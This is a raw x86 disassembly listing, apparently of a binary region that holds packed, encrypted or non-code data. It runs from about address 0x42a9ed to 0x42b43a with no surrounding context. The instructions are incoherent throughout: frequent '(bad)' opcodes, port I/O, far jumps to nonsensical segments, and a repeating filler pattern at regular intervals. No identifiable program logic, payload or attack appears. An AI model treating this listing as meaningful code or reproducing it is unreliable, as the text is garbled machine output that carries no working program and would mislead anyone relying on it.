  42a9ed:	sti    
	...
  42aa56:	test   al,0x93
  42aa58:	sbb    eax,0xfbee3fee
  42aa5d:	xlat   BYTE PTR ds:[ebx]
  42aa5e:	in     eax,0xd3
  42aa60:	aad    0x7
  42aa62:	fwait
  42aa63:	pusha  
  42aa64:	push   edx
  42aa65:	fsub   DWORD PTR [edi-0x37]
  42aa68:	add    DWORD PTR [eax],eax
  42aa6a:	add    BYTE PTR [ecx],al
  42aa6c:	add    BYTE PTR [eax],al
  42aa6e:	jmp    0xea83:0xb5b9a51
  42aa75:	das    
  42aa76:	xor    edx,esp
  42aa78:	jnp    0x42aa81
  42aa7a:	faddp  st(2),st
  42aa7c:	jb     0x42aa9f
  42aa7e:	pop    esi
  42aa7f:	test   al,0xa1
  42aa81:	jmp    0x42aafd
  42aa83:	mov    esi,0xa3314ccd
  42aa88:	les    esi,FWORD PTR [ebx+ebx*1+0x3b]
  42aa8c:	add    eax,0x8ef0261f
  42aa91:	mov    bl,0xc4
  42aa93:	aam    0x3e
  42aa95:	daa    
  42aa96:	mov    edi,0x14a9e9cd
  42aa9b:	arpl   WORD PTR [edx-0x78],si
  42aa9e:	adc    DWORD PTR [esi-0x18df7952],0x9e7d9127
  42aaa8:	xchg   BYTE PTR [ebx+eiz*4+0x135bade4],ah
  42aaaf:	call   0x4a68:0xc5fe4b71
  42aab6:	out    0x2c,al
  42aab8:	cmp    al,0xf7
  42aaba:	int3   
  42aabb:	call   0xa4bb37c0
  42aac0:	aaa    
  42aac1:	cmps   WORD PTR cs:[esi],WORD PTR es:[edi]
  42aac4:	inc    ecx
  42aac5:	jmp    0x378:0x50b8cebd
  42aacc:	mov    al,0xac
  42aace:	push   ebp
  42aacf:	adc    DWORD PTR es:[ecx],ebp
  42aad2:	inc    edx
  42aad3:	mov    ds:0x35c7e0b9,eax
  42aad8:	(bad)  
  42aada:	or     eax,0x6330c0be
  42aadf:	and    BYTE PTR [edx],bh
  42aae1:	iret   
  42aae2:	leave  
  42aae3:	aad    0x79
  42aae5:	sub    eax,DWORD PTR [edi]
  42aae7:	xor    bh,cl
  42aae9:	adc    al,0x45
  42aaeb:	sbb    dh,dh
  42aaed:	adc    ecx,DWORD PTR ss:[edi]
  42aaf0:	jecxz  0x42aa72
  42aaf2:	int    0xf1
  42aaf4:	aad    0x17
  42aaf6:	bswap  esp
  42aaf8:	and    ecx,0x24bc65f6
  42aafe:	sub    DWORD PTR ds:0x7d43c409,edx
  42ab04:	(bad)  [esi-0x69]
  42ab07:	dec    edi
  42ab08:	mov    ds:0x5c33ecea,eax
  42ab0d:	mov    esi,0x461dc4cd
  42ab12:	lods   eax,DWORD PTR ds:[esi]
  42ab13:	sub    edx,esp
  42ab15:	leave  
  42ab16:	mov    DWORD PTR [edi+edi*4+0x36],edx
  42ab1a:	fdivr  QWORD PTR [eax+eax*1]
  42ab1d:	push   cs
  42ab1e:	push   ebp
  42ab1f:	(bad)  [eax+0xd012c2a]
  42ab25:	cmp    al,0xc1
  42ab27:	xchg   DWORD PTR [ebx+0x69],ebp
  42ab2a:	clc    
  42ab2b:	add    al,0xa
  42ab2d:	mov    ecx,DWORD PTR [ecx-0x74]
  42ab30:	ficom  DWORD PTR [esi+eiz*2+0x108c2012]
  42ab37:	mov    eax,ds:0xacdd9690
  42ab3c:	in     eax,0xef
  42ab3e:	loopne 0x42abb9
  42ab40:	ror    DWORD PTR [edx+0x52],cl
  42ab43:	xor    eax,0xd47adc86
  42ab48:	sub    esp,DWORD PTR ds:0xe4f993ff
  42ab4e:	lahf   
  42ab4f:	adc    DWORD PTR [ebp+0x49372ae6],ecx
  42ab55:	in     al,dx
  42ab56:	dec    edi
  42ab57:	or     DWORD PTR [edx],ebp
  42ab59:	in     eax,dx
  42ab5a:	icebp  
  42ab5b:	cld    
  42ab5c:	int3   
  42ab5d:	popf   
  42ab5e:	and    eax,0xf1d604c7
  42ab63:	dec    ecx
  42ab64:	xacquire xchg DWORD PTR [edi],esp
  42ab67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ab68:	mov    dh,0x36
  42ab6a:	int    0xe6
  42ab6c:	inc    ebp
  42ab6d:	jg     0x42ab6f
	...
  42abd3:	add    BYTE PTR [eax],al
  42abd5:	add    BYTE PTR [esi],bh
  42abd7:	push   cs
  42abd8:	sub    al,0x5d
  42abda:	cmp    al,0x7f
  42abdc:	jg     0x42ac4d
  42abde:	and    BYTE PTR [eax],cl
  42abe0:	mov    dl,0x43
  42abe2:	cmp    eax,0x67eacad9
  42abe7:	retf   0x1
  42abea:	add    BYTE PTR [ecx],al
  42abec:	add    BYTE PTR [eax],al
  42abee:	retf   0xa40
  42abf1:	jecxz  0x42abf8
  42abf3:	call   0xd13e6fec
  42abf8:	push   edx
  42abf9:	test   al,0x32
  42abfb:	icebp  
  42abfc:	xor    dl,cl
  42abfe:	out    0x14,al
  42ac00:	mov    ss,WORD PTR [esi]
  42ac02:	push   ds
  42ac03:	push   ebx
  42ac04:	je     0x42abbc
  42ac06:	int    0xb6
  42ac08:	pusha  
  42ac09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ac0a:	add    esp,eax
  42ac0c:	je     0x42ac71
  42ac0e:	sbb    DWORD PTR [ebx+0x1455da1b],edi
  42ac14:	jecxz  0x42ac2f
  42ac16:	xchg   ebp,eax
  42ac17:	lahf   
  42ac18:	(bad)  
  42ac19:	iret   
  42ac1a:	js     0x42ac85
  42ac1c:	mov    bh,0xf0
  42ac1e:	push   eax
  42ac1f:	rcr    DWORD PTR [eax+0x4233],1
  42ac25:	push   esi
  42ac26:	loopne 0x42ac06
  42ac28:	xchg   esi,eax
  42ac29:	ror    DWORD PTR [eax-0x72],cl
  42ac2c:	dec    esp
  42ac2d:	add    BYTE PTR es:[esi-0x666b3c78],cl
  42ac34:	jo     0x42ac5a
  42ac36:	ret    0xd94e
  42ac39:	jbe    0x42ac80
  42ac3b:	rol    DWORD PTR [edi+esi*1+0x4e109db6],0x66
  42ac43:	rol    ebp,cl
  42ac45:	add    BYTE PTR [ebx+0x7a],bh
  42ac48:	sub    DWORD PTR [ebp+0x65],0xffffffe3
  42ac4c:	xchg   edi,eax
  42ac4d:	push   edi
  42ac4e:	xchg   esp,eax
  42ac4f:	jae    0x42ac08
  42ac51:	inc    ebp
  42ac52:	mov    esp,0x944e790b
  42ac57:	cmp    ebx,DWORD PTR [edi]
  42ac59:	in     al,dx
  42ac5a:	daa    
  42ac5b:	pushf  
  42ac5c:	je     0x42ac0f
  42ac5e:	dec    eax
  42ac5f:	dec    ebx
  42ac60:	lahf   
  42ac61:	hlt    
  42ac62:	loopne 0x42ace0
  42ac64:	and    dl,BYTE PTR [ebx]
  42ac66:	mov    dh,0xa6
  42ac68:	jmp    0x42ac37
  42ac6a:	retf   
  42ac6b:	test   edx,esp
  42ac6d:	mov    ecx,0x87fef4ee
  42ac72:	in     al,dx
  42ac73:	push   esp
  42ac74:	int    0xf7
  42ac76:	rcl    BYTE PTR ds:0x3f580e4a,cl
  42ac7c:	jge    0x42ac91
  42ac7e:	sbb    dh,ah
  42ac80:	mov    WORD PTR ds:0x14972942,es
  42ac86:	cwde   
  42ac87:	test   al,0x1c
  42ac89:	xchg   edx,eax
  42ac8a:	in     al,0x31
  42ac8c:	icebp  
  42ac8d:	iret   
  42ac8e:	cmp    al,0x1f
  42ac90:	mov    ch,dh
  42ac92:	enter  0xe1ac,0xa5
  42ac96:	outs   dx,BYTE PTR ds:[esi]
  42ac97:	push   cs
  42ac98:	stos   BYTE PTR es:[edi],al
  42ac99:	xchg   ch,cl
  42ac9b:	gs inc esi
  42ac9d:	gs ret 
  42ac9f:	inc    esp
  42aca0:	call   0xa389a9ff
  42aca5:	dec    edx
  42aca6:	ds sbb eax,0xf9999189
  42acac:	cs ror ebx,0x38
  42acb0:	pusha  
  42acb1:	adc    esp,ebp
  42acb3:	mov    ebp,0x3ee89211
  42acb8:	inc    ecx
  42acb9:	sub    eax,0x707b3327
  42acbe:	retf   
  42acbf:	cmp    eax,0x6ef0d824
  42acc4:	sub    esi,DWORD PTR ds:0x4821cd3b
  42acca:	push   esi
  42accb:	nop
  42accc:	fld    DWORD PTR [ebx+eax*2]
  42accf:	outs   dx,DWORD PTR ds:[esi]
  42acd0:	push   ebx
  42acd1:	(bad)  
  42acd2:	jb     0x42acb6
  42acd4:	(bad)  
  42acd5:	jnp    0x42acb8
  42acd7:	fdiv   st(6),st
  42acd9:	cld    
  42acda:	loope  0x42acd9
  42acdc:	sahf   
  42acdd:	lahf   
  42acde:	or     DWORD PTR [ecx],esp
  42ace0:	les    esi,FWORD PTR [eax+0x23]
  42ace3:	pusha  
  42ace4:	sbb    bl,dl
  42ace6:	sti    
  42ace7:	fisub  WORD PTR [edi+eax*2+0x3103a827]
	...
  42ad56:	jmp    0xdf7cc98d
  42ad5b:	ds out dx,eax
  42ad5d:	repz ret 
  42ad5f:	fcom   DWORD PTR [edx+0x72]
  42ad62:	lock or al,0x1
  42ad65:	loopne 0x42adce
  42ad67:	retf   
  42ad68:	add    DWORD PTR [eax],eax
  42ad6a:	add    BYTE PTR [ecx],al
  42ad6c:	add    BYTE PTR [eax],al
  42ad6e:	mov    edi,0xbb7326ee
  42ad73:	inc    ebp
  42ad74:	stc    
  42ad75:	and    eax,0xcf9be6ba
  42ad7a:	push   ecx
  42ad7b:	(bad)  
  42ad7c:	cwde   
  42ad7d:	xchg   edi,eax
  42ad7e:	lock test BYTE PTR [ebp+0x70],dh
  42ad82:	add    al,0x22
  42ad84:	sub    DWORD PTR [edi-0x4199a436],0xffffffc8
  42ad8b:	dec    esi
  42ad8c:	inc    edx
  42ad8d:	xor    edi,DWORD PTR [edx-0x38]
  42ad90:	mov    dh,BYTE PTR [eax]
  42ad92:	add    BYTE PTR [ebx+0x2],cl
  42ad95:	das    
  42ad96:	int3   
  42ad97:	jle    0x42ad4a
  42ad99:	mov    edx,0x5f5c186b
  42ad9e:	pop    ebp
  42ad9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ada0:	pusha  
  42ada1:	mov    ebx,eax
  42ada3:	mov    esi,0x728d8648
  42ada8:	mov    edi,0xc17323e3
  42adad:	adc    BYTE PTR [ebx+0xa],0xc2
  42adb1:	rcl    esi,0x54
  42adb4:	jecxz  0x42adc1
  42adb6:	cwde   
  42adb7:	xlat   BYTE PTR ds:[ebx]
  42adb8:	test   BYTE PTR [edx],0x6
  42adbb:	xchg   edi,eax
  42adbc:	pop    esp
  42adbd:	mov    ah,0xe1
  42adbf:	mov    edx,0x72d03b5e
  42adc4:	push   es
  42adc5:	imul   ebx,DWORD PTR [eax-0xf],0x20
  42adc9:	sbb    DWORD PTR [ebp+0x911e54e],ebp
  42adcf:	dec    edi
  42add0:	xor    esp,0x136185a0
  42add6:	cmp    DWORD PTR [ecx],0x3a179d69
  42addc:	mov    ds:0x84779cf3,eax
  42ade1:	test   DWORD PTR [edx-0x56],edx
  42ade4:	icebp  
  42ade5:	mov    BYTE PTR [ebp-0x7e7bdf94],bl
  42adeb:	ror    bl,cl
  42aded:	shl    bh,0x4b
  42adf0:	cmp    eax,0x10549bae
  42adf5:	jns    0x42ad9d
  42adf7:	inc    eax
  42adf8:	les    ebx,FWORD PTR ds:0xfc584533
  42adfe:	push   ecx
  42adff:	arpl   WORD PTR [esi-0x7ac5a346],bx
  42ae05:	call   0xc052e497
  42ae0a:	cwde   
  42ae0b:	jns    0x42ae59
  42ae0d:	xor    dh,BYTE PTR [ecx-0x5b05a2a2]
  42ae13:	inc    ebp
  42ae14:	in     al,dx
  42ae15:	xor    DWORD PTR [ecx-0x4b],ecx
  42ae18:	mov    eax,ds:0xee39362e
  42ae1d:	push   ss
  42ae1e:	dec    edi
  42ae1f:	jb     0x42ae93
  42ae21:	jbe    0x42ae9e
  42ae23:	push   ss
  42ae24:	loope  0x42ae61
  42ae26:	jl     0x42ae61
  42ae28:	repz fsubr QWORD PTR [edi]
  42ae2b:	xor    eax,0xd8f27d6e
  42ae30:	pop    edi
  42ae31:	push   eax
  42ae32:	xlat   BYTE PTR ds:[ebx]
  42ae33:	dec    eax
  42ae34:	retf   
  42ae35:	mov    bl,0x77
  42ae37:	sbb    eax,0xd07242b
  42ae3c:	data16 data16 jle 0x42ae99
  42ae40:	adc    eax,0xbc054708
  42ae45:	(bad)  
  42ae46:	shl    edi,1
  42ae48:	mov    dl,al
  42ae4a:	fldcw  WORD PTR [esi+0x7]
  42ae4d:	cmp    eax,0x7a92a655
  42ae52:	and    edx,DWORD PTR [edi+ebx*1+0x1b]
  42ae56:	push   eax
  42ae57:	adc    eax,0xa8d9a105
  42ae5c:	xchg   esi,eax
  42ae5d:	add    eax,0x88061385
  42ae62:	gs cli 
  42ae64:	daa    
  42ae65:	imul   BYTE PTR [esi]
  42ae67:	outs   dx,DWORD PTR ds:[esi]
  42ae68:	mov    edi,0xedca310f
  42ae6d:	fild   DWORD PTR [eax]
	...
  42aed3:	add    BYTE PTR [eax],al
  42aed5:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42aedb:	mov    edi,0x7bd8f7ff
  42aee0:	mov    dh,0xb9
  42aee2:	iret   
  42aee3:	and    eax,0xcc67ca2c
  42aee8:	add    DWORD PTR [eax],eax
  42aeea:	add    BYTE PTR [ecx],al
  42aeec:	add    BYTE PTR [eax],al
  42aeee:	mov    DWORD PTR [edx+0x3d],esp
  42aef1:	in     eax,0x94
  42aef3:	dec    eax
  42aef4:	mov    edx,DWORD PTR [esi+0x65]
  42aef7:	fisub  DWORD PTR [eax-0x29]
  42aefa:	or     ah,BYTE PTR [eax-0x2e]
  42aefd:	inc    edx
  42aefe:	push   ecx
  42aeff:	push   edx
  42af00:	(bad)  
  42af01:	mov    eax,DWORD PTR [esi]
  42af03:	adc    eax,0xf1c57d07
  42af08:	inc    edx
  42af09:	and    esp,DWORD PTR [eax+0x3a]
  42af0c:	int    0xd7
  42af0e:	jnp    0x42af3b
  42af10:	sub    edi,DWORD PTR [ecx+0x526cdc83]
  42af16:	fisttp QWORD PTR [ecx]
  42af18:	jle    0x42aebb
  42af1a:	mov    al,0xf
  42af1c:	shl    DWORD PTR [eax-0x2ff2b28b],1
  42af22:	stc    
  42af23:	loop   0x42af35
  42af25:	data16 aas 
  42af27:	ror    DWORD PTR [edx+0x49],1
  42af2a:	push   cx
  42af2c:	jl     0x42af59
  42af2e:	idiv   DWORD PTR [eax+0x3b]
  42af31:	push   0x1e
  42af33:	ret    
  42af34:	add    cl,dh
  42af36:	sahf   
  42af37:	dec    eax
  42af38:	push   edi
  42af39:	or     al,BYTE PTR [esi+0x73]
  42af3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42af3d:	and    al,0x1f
  42af3f:	(bad)  
  42af40:	out    0x51,al
  42af42:	xor    bl,BYTE PTR [ebx+esi*2]
  42af45:	sti    
  42af46:	cmp    al,0x53
  42af48:	mov    bh,0x1c
  42af4a:	push   esp
  42af4b:	cmp    edx,eax
  42af4d:	xor    cl,BYTE PTR [eax+0x56840082]
  42af53:	test   al,0x3d
  42af55:	fsub   DWORD PTR [edi-0x6a]
  42af58:	fldcw  WORD PTR [ebx+0x32e6105]
  42af5e:	ror    DWORD PTR [ecx-0x20],0xab
  42af62:	dec    edx
  42af63:	dec    ecx
  42af64:	repnz xor bl,ch
  42af67:	cwde   
  42af68:	and    al,BYTE PTR [ebx+0x6d]
  42af6b:	mov    ?,ecx
  42af6d:	mov    eax,ds:0xfcb9dd0e
  42af72:	mov    gs,WORD PTR [esi]
  42af74:	cmp    ecx,DWORD PTR [eax+0x54f823c1]
  42af7a:	and    al,dl
  42af7c:	sub    eax,0x5e9ec1ac
  42af81:	ret    
  42af82:	(bad)  
  42af84:	scas   al,BYTE PTR es:[edi]
  42af85:	xchg   ebp,eax
  42af86:	test   dl,dl
  42af88:	lods   eax,DWORD PTR ds:[esi]
  42af89:	in     al,dx
  42af8a:	or     dl,bh
  42af8c:	fs jo  0x42afd2
  42af8f:	add    DWORD PTR [esi+0x4e00f604],ecx
  42af95:	fwait
  42af96:	jno    0x42b005
  42af98:	shl    DWORD PTR [ecx+0x1b],1
  42af9b:	mov    edi,0x3a648744
  42afa0:	rcr    DWORD PTR [esi],cl
  42afa2:	sub    eax,0x4336c643
  42afa7:	adc    DWORD PTR [ebp-0x5f50193a],0xbf2d2e16
  42afb1:	loopne 0x42b02a
  42afb3:	stos   DWORD PTR es:[edi],eax
  42afb4:	ja     0x42affb
  42afb6:	test   BYTE PTR [ebx],dl
  42afb8:	outs   dx,BYTE PTR ds:[esi]
  42afb9:	mov    ecx,0xbb6db494
  42afbe:	ss xchg edi,eax
  42afc0:	ror    BYTE PTR [edi],1
  42afc2:	push   0x32
  42afc4:	aaa    
  42afc5:	mov    al,0x18
  42afc7:	or     BYTE PTR [esi-0x16e2e39],dl
  42afcd:	outs   dx,BYTE PTR ds:[esi]
  42afce:	(bad)  
  42afcf:	mov    bh,0xeb
  42afd1:	mov    dl,0x11
  42afd3:	jmp    0x5888895e
  42afd8:	mov    ds:0x4cdcc76a,al
  42afdd:	mov    eax,0x48130c4c
  42afe2:	je     0x42af89
  42afe4:	rcr    DWORD PTR [esi+0x48],cl
  42afe7:	jne    0x42b055
  42afe9:	retf   
  42afea:	cmp    dl,BYTE PTR [eax-0x49]
  42afed:	in     al,dx
	...
  42b056:	stc    
  42b057:	enter  0xdc7a,0x7b
  42b05b:	(bad)  
  42b05c:	(bad)  
  42b05d:	in     eax,dx
  42b05e:	sbb    al,0x4f
  42b060:	push   ebp
  42b061:	inc    esp
  42b062:	and    BYTE PTR [ebp+ebp*4+0x1cd671d],cl
  42b069:	add    BYTE PTR [eax],al
  42b06b:	add    DWORD PTR [eax],eax
  42b06d:	add    BYTE PTR [ebp+ebx*2-0x1ed5c974],bl
  42b074:	xor    ebp,DWORD PTR [edx]
  42b076:	push   cs
  42b077:	adc    ebx,DWORD PTR [eax]
  42b079:	jg     0x42b020
  42b07b:	rcr    DWORD PTR [edx+0x3b],cl
  42b07e:	mov    ecx,0xff4a6f6f
  42b083:	xor    esi,edi
  42b085:	les    ecx,FWORD PTR [eax-0x34d07e9c]
  42b08b:	stc    
  42b08c:	mov    cl,0x4b
  42b08e:	jne    0x42b085
  42b090:	test   edi,eax
  42b092:	fcomp  DWORD PTR [edx]
  42b094:	hlt    
  42b095:	imul   BYTE PTR [edx]
  42b097:	xlat   BYTE PTR ds:[ebx]
  42b098:	and    BYTE PTR [edi+0x57a3d50b],dl
  42b09e:	cmc    
  42b09f:	sbb    edi,DWORD PTR [esi+0x3bb41aa1]
  42b0a5:	xor    ah,BYTE PTR [ebp-0x54a4be64]
  42b0ab:	(bad)  
  42b0ac:	or     dh,BYTE PTR [ecx+ecx*2]
  42b0af:	sbb    DWORD PTR [ebp+0x748569ed],ebx
  42b0b5:	sbb    esi,DWORD PTR [eax]
  42b0b7:	xchg   esp,eax
  42b0b8:	into   
  42b0b9:	jg     0x42b0e8
  42b0bb:	mov    dl,0x4
  42b0bd:	adc    ecx,ebx
  42b0bf:	add    cl,bl
  42b0c1:	aaa    
  42b0c2:	dec    esi
  42b0c3:	and    cl,dl
  42b0c5:	es out 0x2d,eax
  42b0c8:	shr    bh,cl
  42b0ca:	add    dh,BYTE PTR [eax+edx*4+0x6b]
  42b0ce:	aad    0x58
  42b0d0:	out    dx,al
  42b0d1:	mov    ds:0xd66430da,al
  42b0d6:	inc    esp
  42b0d7:	aaa    
  42b0d8:	jp     0x42b0db
  42b0da:	lds    esi,FWORD PTR [esi-0x1d]
  42b0dd:	lds    esp,FWORD PTR es:[esi+0x1e]
  42b0e1:	inc    eax
  42b0e2:	mov    al,0xcf
  42b0e4:	int3   
  42b0e5:	cmp    eax,0x24378465
  42b0ea:	lds    ecx,FWORD PTR [eax-0x32]
  42b0ed:	dec    eax
  42b0ee:	sbb    al,0xf1
  42b0f0:	jno    0x42b131
  42b0f2:	xchg   edi,eax
  42b0f3:	jnp    0x42b113
  42b0f5:	retf   
  42b0f6:	cmp    BYTE PTR [ecx+0x3f],0xdd
  42b0fa:	inc    esi
  42b0fb:	rcr    BYTE PTR [ebx-0x4bf6fcaa],0xdd
  42b102:	out    0x48,eax
  42b104:	cmp    ch,BYTE PTR [edx]
  42b106:	ret    
  42b107:	pop    edx
  42b108:	ins    BYTE PTR es:[edi],dx
  42b109:	lea    esi,[eax+edi*4]
  42b10c:	mov    esp,0xcfff8998
  42b111:	sbb    dl,BYTE PTR [edx]
  42b113:	mov    edi,0x3e82e2f7
  42b118:	jecxz  0x42b178
  42b11a:	xor    al,dh
  42b11c:	popa   
  42b11d:	div    DWORD PTR ds:0xc27bb5ed
  42b123:	sbb    DWORD PTR [esi+0x4b],edx
  42b126:	(bad)  
  42b127:	and    eax,0x60a5f1b0
  42b12c:	popa   
  42b12d:	mov    ecx,ecx
  42b12f:	(bad)  
  42b131:	add    al,0xf3
  42b133:	sub    al,0x40
  42b135:	pop    eax
  42b136:	xlat   BYTE PTR ds:[ebx]
  42b137:	popa   
  42b138:	jl     0x42b198
  42b13a:	mov    ds:0x4c62bdab,eax
  42b13f:	fidiv  DWORD PTR [ebx-0x1c2fbc2c]
  42b145:	xchg   esp,eax
  42b146:	push   cs
  42b147:	xor    BYTE PTR [edi-0x73e1079b],al
  42b14d:	jno    0x42b15d
  42b14f:	jo     0x42b0fe
  42b151:	ja     0x42b153
  42b153:	pop    es
  42b154:	gs fucom st(3)
  42b158:	and    edi,DWORD PTR [edi-0x6c]
  42b15b:	xchg   esi,eax
  42b15c:	pop    ecx
  42b15d:	inc    ecx
  42b15e:	daa    
  42b15f:	dec    ecx
  42b160:	jns    0x42b0ec
  42b162:	bound  ebx,QWORD PTR [ebp+0x594d545c]
  42b168:	and    eax,0xc2f8d731
  42b16d:	mov    edi,0x0
	...
  42b1d6:	jne    0x42b1fd
  42b1d8:	imul   ebx,DWORD PTR [edi-0x51]
  42b1dc:	cmc    
  42b1dd:	call   eax
  42b1df:	inc    ebx
  42b1e0:	push   edi
  42b1e1:	popa   
  42b1e2:	xchg   edx,eax
  42b1e3:	pop    esi
  42b1e4:	mov    bl,0xa9
  42b1e6:	addr16 into 
  42b1e8:	add    DWORD PTR [eax],eax
  42b1ea:	add    BYTE PTR [ecx],al
  42b1ec:	add    BYTE PTR [eax],al
  42b1ee:	nop
  42b1ef:	jmp    0xa08cd917
  42b1f4:	push   ds
  42b1f5:	mov    ebp,DWORD PTR [edi]
  42b1f7:	xlat   BYTE PTR ds:[ebx]
  42b1f8:	mov    DWORD PTR [esi+0x63278b7b],esi
  42b1fe:	lds    bx,DWORD PTR [ecx-0x10]
  42b202:	xlat   BYTE PTR ds:[ebx]
  42b203:	mov    edx,0xb5ac2e14
  42b208:	mov    ds:0xad63f8d,eax
  42b20d:	test   eax,0x3972e075
  42b212:	fs pop edx
  42b214:	pushf  
  42b215:	imul   ecx,DWORD PTR [edx],0xed3c30a
  42b21b:	mov    ss,WORD PTR [esi+0x79c697f6]
  42b221:	stc    
  42b222:	add    ebx,DWORD PTR [edi+0x76d0de9e]
  42b228:	int3   
  42b229:	sbb    BYTE PTR [ecx+0x6e9b0d85],ah
  42b22f:	sub    edx,0xffffff9a
  42b232:	inc    ebp
  42b233:	push   0xd13efb70
  42b238:	mov    ds:0x299ee73c,eax
  42b23d:	idiv   DWORD PTR [edi]
  42b23f:	inc    esp
  42b240:	dec    esi
  42b241:	stos   BYTE PTR es:[edi],al
  42b242:	mov    bh,0x15
  42b244:	arpl   WORD PTR [edx+0x4d],di
  42b247:	mov    al,ds:0x6cf1e6ea
  42b24c:	jnp    0x42b29a
  42b24e:	outs   dx,BYTE PTR ds:[esi]
  42b24f:	xchg   edi,eax
  42b250:	jmp    0xead28aa4
  42b255:	push   esi
  42b256:	push   ss
  42b257:	mov    esp,0xd511b68f
  42b25c:	cwde   
  42b25d:	adc    edx,ebx
  42b25f:	(bad)  
  42b260:	cdq    
  42b261:	pop    ebp
  42b262:	test   al,0xf3
  42b264:	mov    eax,ds:0xc6fdaf77
  42b269:	in     eax,0xe
  42b26b:	mov    esp,0xbf778e9a
  42b270:	add    BYTE PTR [edi+0x5be7327e],cl
  42b276:	xchg   ebp,eax
  42b277:	aad    0x11
  42b279:	sub    esp,ebp
  42b27b:	cmp    eax,0x350d622c
  42b280:	jge    0x42b281
  42b282:	nop
  42b283:	add    al,0xd9
  42b285:	mov    dh,ch
  42b287:	push   eax
  42b288:	inc    ebx
  42b289:	dec    ebp
  42b28a:	fisubr DWORD PTR [esi+eax*2+0x1f88df1d]
  42b291:	push   esi
  42b292:	inc    esi
  42b293:	mov    ebp,0x5ca16b30
  42b298:	aas    
  42b299:	pop    esp
  42b29a:	pop    esi
  42b29b:	dec    ebx
  42b29c:	jmp    0xdf85dfd0
  42b2a1:	call   0x5f9e:0xd4cfb25a
  42b2a8:	in     eax,dx
  42b2a9:	ins    DWORD PTR es:[edi],dx
  42b2aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b2ab:	pop    edi
  42b2ac:	es or  al,0x7c
  42b2af:	sbb    cl,BYTE PTR [edi+0x8]
  42b2b2:	das    
  42b2b3:	inc    edx
  42b2b4:	out    0x7a,eax
  42b2b6:	fcomp  st(1)
  42b2b8:	mov    ds:0x857ce827,al
  42b2bd:	out    0x21,eax
  42b2bf:	test   DWORD PTR [eax],esi
  42b2c1:	adc    bh,bh
  42b2c3:	push   ebp
  42b2c4:	mov    eax,0xfc4d94c7
  42b2c9:	inc    esp
  42b2ca:	in     al,dx
  42b2cb:	retf   
  42b2cc:	mov    ch,0x1e
  42b2ce:	dec    ebp
  42b2cf:	sbb    eax,0x935fac1c
  42b2d4:	mov    cs,esi
  42b2d6:	outs   dx,DWORD PTR ds:[esi]
  42b2d7:	push   cs
  42b2d8:	inc    ebx
  42b2d9:	xchg   edi,eax
  42b2da:	aad    0xce
  42b2dc:	mov    edx,DWORD PTR [edx]
  42b2de:	(bad)  
  42b2df:	mov    esp,0xa73b6d70
  42b2e4:	fdivr  QWORD PTR [edi+0x5f]
  42b2e7:	out    0x17,eax
  42b2e9:	lods   eax,DWORD PTR ds:[esi]
  42b2ea:	mov    edx,0x14e166
	...
  42b353:	add    BYTE PTR [eax],al
  42b355:	add    BYTE PTR [ebp-0x449f6672],ah
  42b35b:	ja     0x42b35a
  42b35d:	iret   
  42b35e:	sub    eax,0xbc738e65
  42b363:	push   esi
  42b364:	sahf   
  42b365:	mov    ah,0x67
  42b367:	iret   
  42b368:	add    DWORD PTR [eax],eax
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	cmp    BYTE PTR [edi],bl
  42b370:	imul   esi,DWORD PTR [esi+0x51ff6048],0xffffff87
  42b377:	mov    edi,0x87ae4c8d
  42b37c:	push   0xffffffdc
  42b37e:	adc    BYTE PTR [ebx],bl
  42b380:	or     al,0x90
  42b382:	mov    ds:0xb8818c5a,al
  42b387:	popa   
  42b388:	cmp    eax,0x9b4857e1
  42b38d:	out    dx,al
  42b38e:	mov    ah,0x2a
  42b390:	push   ecx
  42b391:	mov    edx,0x66185f3a
  42b396:	cld    
  42b397:	jmp    0xa874:0x8754abda
  42b39e:	mov    ?,WORD PTR ds:0xeee881fc
  42b3a4:	pop    ds
  42b3a5:	pop    esi
  42b3a6:	xchg   esi,eax
  42b3a7:	dec    ecx
  42b3a8:	mov    ebp,0x5a9ab1e
  42b3ad:	push   ebx
  42b3ae:	push   cs
  42b3af:	push   ebp
  42b3b0:	adc    cl,cl
  42b3b2:	lods   al,BYTE PTR ds:[esi]
  42b3b3:	dec    edx
  42b3b4:	das    
  42b3b5:	(bad)  
  42b3b6:	(bad)  
  42b3b7:	mov    eax,0xecc323
  42b3bc:	push   0xe2d1f4f8
  42b3c1:	dec    ebp
  42b3c2:	or     ebx,esp
  42b3c4:	enter  0x629c,0xeb
  42b3c8:	test   al,0xc6
  42b3ca:	scas   eax,DWORD PTR es:[edi]
  42b3cb:	(bad)  
  42b3cc:	cs nop
  42b3ce:	jne    0x42b405
  42b3d0:	mov    eax,ds:0x3781740
  42b3d5:	mov    esp,0x72b66faa
  42b3da:	das    
  42b3db:	sar    DWORD PTR [edi-0x63f181d3],1
  42b3e1:	stc    
  42b3e2:	sti    
  42b3e3:	shl    DWORD PTR [edx],0x3f
  42b3e6:	retf   0xf2ba
  42b3e9:	lea    esp,ds:0x882b93e8
  42b3ef:	jmp    0x42b430
  42b3f1:	fwait
  42b3f2:	push   eax
  42b3f3:	mov    ds:0xd6cceced,al
  42b3f8:	sbb    ebp,ecx
  42b3fa:	push   es
  42b3fb:	sbb    al,0x38
  42b3fd:	cmp    al,BYTE PTR [ecx+0x62]
  42b400:	jmp    0x42b3e2
  42b402:	sbb    edi,esp
  42b404:	add    edx,DWORD PTR [esi+edx*8-0x62]
  42b408:	cli    
  42b409:	retf   
  42b40a:	in     eax,0x45
  42b40c:	(bad)  
  42b40d:	ins    BYTE PTR es:[edi],dx
  42b40e:	repnz adc DWORD PTR [esi],esi
  42b411:	push   esi
  42b412:	inc    esi
  42b413:	inc    esp
  42b414:	call   0x8d1f:0x93b7b678
  42b41b:	pusha  
  42b41c:	lea    ebp,[eax-0x6d]
  42b41f:	push   edi
  42b420:	inc    esp
  42b421:	xor    DWORD PTR [ebp+0x41],esp
  42b424:	(bad)  
  42b425:	aaa    
  42b426:	mov    ds:0x99f39f6c,al
  42b42b:	loop   0x42b410
  42b42d:	jmp    0xec96:0x3582c00d
  42b434:	add    esp,DWORD PTR [esi-0x31]
  42b437:	adc    ebp,eax
  42b439:	dec    edi
  42b43a:	mov    cl,0x4a
